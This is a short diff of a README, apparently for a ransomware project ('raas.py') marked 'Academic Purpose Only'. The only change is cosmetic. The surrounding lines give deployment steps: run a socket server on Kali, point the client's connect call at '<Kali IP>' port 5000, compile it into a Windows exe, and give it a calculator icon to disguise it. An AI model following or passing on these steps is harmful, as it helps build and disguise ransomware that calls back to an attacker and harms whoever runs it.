@@ -5,7 +5,7 @@ Deployed on Windows environment.
 ## Academic Purpose Only ##
 
 # Flow #
-Execute socket_server.py on your Kali
+- Execute socket_server.py on your Kali -
 Modify raas.py lines 32 client_socket.connect(("<Kali IP>", 5000))
 Run autopytoexe convertor the program as a exe
 Replace Icon to calculator.ico
